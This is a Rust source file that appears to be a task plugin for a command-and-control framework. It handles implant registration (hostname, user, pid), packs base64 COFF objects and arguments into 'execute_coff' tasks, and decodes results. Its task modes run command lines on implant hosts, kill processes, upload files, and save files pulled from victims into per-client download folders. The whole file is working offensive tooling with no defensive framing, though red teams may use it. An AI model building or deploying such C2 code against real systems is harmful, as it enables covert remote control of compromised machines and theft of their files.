use std::{
    fs,
    io::{self, BufRead, BufReader, BufWriter, Error, ErrorKind, Result, Write},
    path::{Path, PathBuf},
};

use base64::{engine::general_purpose::STANDARD, Engine as _};
use serde::{Deserialize, Serialize};
use serde_json::{json, Map, Value};
use uuid::Uuid;

const PLUGIN_API_VERSION: u32 = 1;

fn main() -> Result<()> {
    let package_root = std::env::current_dir()?;
    let manifest = IntegrationManifest::load(&package_root.join("manifest.json"))?;
    let payloads = load_payload_definitions(&manifest);
    let stdin = io::stdin();
    let stdout = io::stdout();
    let mut reader = BufReader::new(stdin.lock());
    let mut writer = BufWriter::new(stdout.lock());

    loop {
        let mut line = String::new();
        let read = reader.read_line(&mut line)?;
        if read == 0 {
            break;
        }
        let request: RequestEnvelope = serde_json::from_str(line.trim_end()).map_err(invalid_json)?;
        let response = match handle_request(&manifest, &payloads, &request) {
            Ok(payload) => ResponseEnvelope {
                request_id: request.request_id,
                ok: true,
                payload: Some(payload),
                error: None,
            },
            Err(err) => ResponseEnvelope {
                request_id: request.request_id,
                ok: false,
                payload: None,
                error: Some(err.to_string()),
            },
        };
        serde_json::to_writer(&mut writer, &response).map_err(invalid_json)?;
        writer.write_all(b"\n")?;
        writer.flush()?;
    }

    Ok(())
}

fn handle_request(
    manifest: &IntegrationManifest,
    payloads: &[PayloadDefinition],
    request: &RequestEnvelope,
) -> Result<Value> {
    match request.operation.as_str() {
        "get_manifest" => serde_json::to_value(PluginRuntimeHandshake {
            plugin_api_version: PLUGIN_API_VERSION,
            manifest: manifest.clone(),
        })
        .map_err(invalid_json),
        "validate_registration" => {
            let payload: RegisterPayload = serde_json::from_value(request.payload.clone()).map_err(invalid_json)?;
            validate_registration(manifest, &payload)?;
            Ok(json!({ "ok": true }))
        }
        "build_task" => {
            let payload: BuildTaskRequest = serde_json::from_value(request.payload.clone()).map_err(invalid_json)?;
            build_task(payloads, &payload)
        }
        "serialize_task" => {
            let payload: SerializeTaskRequest = serde_json::from_value(request.payload.clone()).map_err(invalid_json)?;
            serialize_task(&payload.task)
        }
        "decode_result" => {
            let payload: DecodeResultRequest = serde_json::from_value(request.payload.clone()).map_err(invalid_json)?;
            decode_result(&payload.task, payload.payload)
        }
        other => Err(Error::new(
            ErrorKind::InvalidInput,
            format!("Unknown operation '{other}'"),
        )),
    }
}

fn validate_registration(manifest: &IntegrationManifest, payload: &RegisterPayload) -> Result<()> {
    if payload.implant_type != manifest.implant_type {
        return Err(Error::new(
            ErrorKind::InvalidInput,
            format!(
                "Integration '{}' does not accept implant type '{}'",
                manifest.id, payload.implant_type
            ),
        ));
    }
    if manifest.protocol_versions.contains(&payload.protocol_version) {
        Ok(())
    } else {
        Err(Error::new(
            ErrorKind::InvalidInput,
            format!(
                "Unsupported protocol version {} for implant type {}",
                payload.protocol_version, payload.implant_type
            ),
        ))
    }
}

fn build_task(payloads: &[PayloadDefinition], request: &BuildTaskRequest) -> Result<Value> {
    let Some(definition) = payloads.iter().find(|definition| definition.command_name == request.task_kind) else {
        return Ok(json!({ "queued_task": null }));
    };
    let artifact = request
        .artifacts
        .iter()
        .find(|artifact| artifact.logical_name == definition.logical_name)
        .ok_or_else(|| {
            Error::new(
                ErrorKind::NotFound,
                format!("Missing artifact '{}'", definition.logical_name),
            )
        })?;
    let (payload_args, result_handling) = validate_and_pack_args(&request.implant, definition, &request.args)?;
    let state = ZantTaskState {
        task_type: "execute_coff".to_string(),
        object_name: artifact.file_name.clone(),
        entrypoint: definition.entrypoint.clone(),
        object_encoding: "base64".to_string(),
        object_data: artifact.bytes_b64.clone(),
        args_encoding: "base64".to_string(),
        args_data: STANDARD.encode(encode_argument_blob(&payload_args)),
        result_handling,
    };
    Ok(json!({
        "queued_task": {
            "kind": definition.command_name,
            "required_capability": "execute_coff",
            "state": state
        }
    }))
}

fn serialize_task(task: &PluginTaskRecord) -> Result<Value> {
    let state: ZantTaskState = serde_json::from_value(task.state.clone()).map_err(invalid_json)?;
    Ok(json!({
        "task_id": task.task_id,
        "task_type": state.task_type,
        "fields": task_fields(&state)
    }))
}

fn decode_result(task: &PluginTaskRecord, payload: TaskResultPayload) -> Result<Value> {
    let status = if payload.status.eq_ignore_ascii_case("success") {
        "completed"
    } else {
        "failed"
    };
    if payload.result_encoding.is_empty() {
        return Err(Error::new(ErrorKind::InvalidInput, "Missing result encoding"));
    }
    let state: ZantTaskState = serde_json::from_value(task.state.clone()).map_err(invalid_json)?;
    let result = match (&state.result_handling, status) {
        (ZantResultHandling::Text, "completed") => json!({
            "type": "text",
            "encoding": payload.result_encoding,
            "data": payload.result_data
        }),
        (ZantResultHandling::Download { save_path }, "completed") => {
            let bytes = STANDARD.decode(payload.result_data).map_err(|err| {
                Error::new(
                    ErrorKind::InvalidInput,
                    format!("Invalid base64 download result: {err}"),
                )
            })?;
            if let Some(parent) = save_path.parent() {
                fs::create_dir_all(parent)?;
            }
            fs::write(save_path, &bytes)?;
            json!({
                "type": "text",
                "encoding": "utf8",
                "data": format!("saved {} bytes to {}", bytes.len(), save_path.display())
            })
        }
        _ => json!({
            "type": "text",
            "encoding": payload.result_encoding,
            "data": payload.result_data
        }),
    };
    Ok(json!({
        "task_id": payload.task_id,
        "status": status,
        "result": result
    }))
}

fn load_payload_definitions(manifest: &IntegrationManifest) -> Vec<PayloadDefinition> {
    manifest
        .tasks
        .iter()
        .map(|task| PayloadDefinition {
            command_name: task.kind.clone(),
            logical_name: task.artifact.clone(),
            entrypoint: task.entrypoint.clone(),
            usage: task.usage.clone(),
            arg_mode: task.arg_mode.clone(),
        })
        .collect()
}

fn validate_and_pack_args(
    implant: &PluginImplantContext,
    definition: &PayloadDefinition,
    args: &[String],
) -> Result<(Vec<String>, ZantResultHandling)> {
    match &definition.arg_mode {
        ManifestArgMode::None => {
            if args.is_empty() {
                Ok((Vec::new(), ZantResultHandling::Text))
            } else {
                Err(invalid_usage(&definition.usage))
            }
        }
        ManifestArgMode::Exact { count } => {
            if args.len() == *count {
                Ok((args.to_vec(), ZantResultHandling::Text))
            } else {
                Err(invalid_usage(&definition.usage))
            }
        }
        ManifestArgMode::OptionalSingle { default_value } => {
            if args.len() > 1 {
                return Err(invalid_usage(&definition.usage));
            }
            if let Some(arg) = args.first() {
                Ok((vec![arg.clone()], ZantResultHandling::Text))
            } else {
                Ok((vec![default_value.clone()], ZantResultHandling::Text))
            }
        }
        ManifestArgMode::ExecuteCommandLine => {
            if args.is_empty() {
                Err(invalid_usage(&definition.usage))
            } else {
                Ok((vec![args.join(" ")], ZantResultHandling::Text))
            }
        }
        ManifestArgMode::Download => {
            if args.is_empty() || args.len() > 2 {
                return Err(invalid_usage(&definition.usage));
            }
            let remote_path = args[0].clone();
            let save_path = match args.get(1) {
                Some(path) => PathBuf::from(path),
                None => default_download_path(implant, &remote_path),
            };
            Ok((vec![remote_path], ZantResultHandling::Download { save_path }))
        }
        ManifestArgMode::UploadFromServer => {
            if args.len() < 2 {
                Err(invalid_usage(&definition.usage))
            } else {
                let source_path = PathBuf::from(&args[0]);
                let file_bytes = fs::read(&source_path).map_err(|err| {
                    Error::new(
                        ErrorKind::InvalidInput,
                        format!("Unable to read upload source '{}': {err}", source_path.display()),
                    )
                })?;
                Ok((
                    vec![args[1].clone(), STANDARD.encode(file_bytes)],
                    ZantResultHandling::Text,
                ))
            }
        }
        ManifestArgMode::KillPid => {
            if args.len() != 1 || args[0].parse::<u32>().is_err() {
                Err(invalid_usage(&definition.usage))
            } else {
                Ok((args.to_vec(), ZantResultHandling::Text))
            }
        }
    }
}

fn invalid_usage(usage: &str) -> Error {
    Error::new(ErrorKind::InvalidInput, format!("Usage: {usage}"))
}

fn encode_argument_blob(args: &[String]) -> Vec<u8> {
    let mut encoded = Vec::new();
    encoded.extend_from_slice(&(args.len() as u32).to_le_bytes());
    for arg in args {
        let bytes = arg.as_bytes();
        encoded.extend_from_slice(&(bytes.len() as u32).to_le_bytes());
        encoded.extend_from_slice(bytes);
    }
    encoded
}

fn task_fields(state: &ZantTaskState) -> Map<String, Value> {
    let Value::Object(mut map) = serde_json::to_value(state)
        .expect("serializing zant task state should always produce an object")
    else {
        unreachable!();
    };
    map.remove("task_type");
    map.remove("result_handling");
    map
}

fn default_download_path(implant: &PluginImplantContext, remote_path: &str) -> PathBuf {
    let file_name = Path::new(remote_path)
        .file_name()
        .and_then(|value| value.to_str())
        .filter(|value| !value.is_empty())
        .unwrap_or("download.bin");
    PathBuf::from("downloads")
        .join(implant.clientid.to_string())
        .join(file_name)
}

fn invalid_json(err: serde_json::Error) -> Error {
    Error::new(ErrorKind::InvalidData, format!("Invalid JSON: {err}"))
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct RequestEnvelope {
    request_id: String,
    operation: String,
    payload: Value,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct ResponseEnvelope {
    request_id: String,
    ok: bool,
    #[serde(default)]
    payload: Option<Value>,
    #[serde(default)]
    error: Option<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct PluginRuntimeHandshake {
    plugin_api_version: u32,
    manifest: IntegrationManifest,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct BuildTaskRequest {
    implant: PluginImplantContext,
    task_kind: String,
    #[serde(default)]
    args: Vec<String>,
    #[serde(default)]
    artifacts: Vec<PluginArtifact>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct SerializeTaskRequest {
    task: PluginTaskRecord,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct DecodeResultRequest {
    task: PluginTaskRecord,
    payload: TaskResultPayload,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct PluginTaskRecord {
    task_id: Uuid,
    integration_id: String,
    task_kind: String,
    state: Value,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct PluginImplantContext {
    clientid: Uuid,
    implant_type: String,
    family: String,
    #[serde(default)]
    capabilities: Vec<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct PluginArtifact {
    logical_name: String,
    file_name: String,
    bytes_b64: String,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct RegisterPayload {
    implant_type: String,
    protocol_version: u32,
    hostname: String,
    username: String,
    pid: u32,
    process_name: String,
    os: String,
    arch: String,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct TaskResultPayload {
    task_id: Uuid,
    status: String,
    result_encoding: String,
    result_data: String,
}

#[derive(Debug, Clone)]
struct PayloadDefinition {
    command_name: String,
    logical_name: String,
    entrypoint: String,
    usage: String,
    arg_mode: ManifestArgMode,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "result_type", rename_all = "snake_case")]
enum ZantResultHandling {
    Text,
    Download { save_path: PathBuf },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ZantTaskState {
    task_type: String,
    object_name: String,
    entrypoint: String,
    object_encoding: String,
    object_data: String,
    args_encoding: String,
    args_data: String,
    result_handling: ZantResultHandling,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct IntegrationManifest {
    #[serde(default = "default_schema_version")]
    schema_version: u32,
    #[serde(default = "default_plugin_api_version")]
    plugin_api_version: u32,
    id: String,
    #[serde(default)]
    display_name: String,
    #[serde(default)]
    description: String,
    implant_type: String,
    family: String,
    protocol_versions: Vec<u32>,
    capabilities: Vec<String>,
    artifact_roots: Vec<String>,
    tasks: Vec<ManifestTaskDefinition>,
    ui_actions: Vec<ManifestUiActionDefinition>,
}

impl IntegrationManifest {
    fn load(path: &Path) -> Result<Self> {
        let contents = fs::read_to_string(path)?;
        serde_json::from_str(&contents).map_err(invalid_json)
    }
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct ManifestTaskDefinition {
    kind: String,
    usage: String,
    artifact: String,
    entrypoint: String,
    arg_mode: ManifestArgMode,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(tag = "type", rename_all = "snake_case")]
enum ManifestArgMode {
    None,
    Exact { count: usize },
    OptionalSingle { default_value: String },
    ExecuteCommandLine,
    Download,
    UploadFromServer,
    KillPid,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
struct ManifestUiActionDefinition {
    id: String,
    label: String,
    task_kind: Option<String>,
    #[serde(default)]
    args_template: Vec<String>,
    command_template: Option<String>,
    #[serde(default)]
    queue_immediately: bool,
}

fn default_schema_version() -> u32 {
    1
}

fn default_plugin_api_version() -> u32 {
    1
}
